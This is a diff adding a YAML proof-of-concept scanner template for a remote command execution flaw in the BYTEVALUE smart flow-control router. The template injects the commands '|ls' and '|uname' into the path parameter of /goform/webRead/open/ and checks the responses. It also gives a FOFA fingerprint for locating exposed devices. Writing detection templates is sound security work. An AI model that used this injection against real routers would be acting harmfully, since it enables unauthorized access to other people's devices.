@@ -1,0 +1,25 @@
+id: poc-yaml-bwtd-intelligent-flow-control-router-open-rce
+info:
+  name: 百为通达 智能流控路由器 open 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 智能流控路由器
+  fofa: BYTEVALUE 智能流控路由器
+requests:
+- method: GET
+  path: /goform/webRead/open/?path=|ls
+  expression: 'status_code == 200
+
+    && contains(body,"access.log")
+
+    && contains(body,"config")
+
+    && !contains(body,"<")
+
+    '
+- method: GET
+  path: /goform/webRead/open/?path=|uname
+  expression: status_code == 200 && contains(body,"Linux") && !contains(body,"<")
+variables: {}
+transport: http
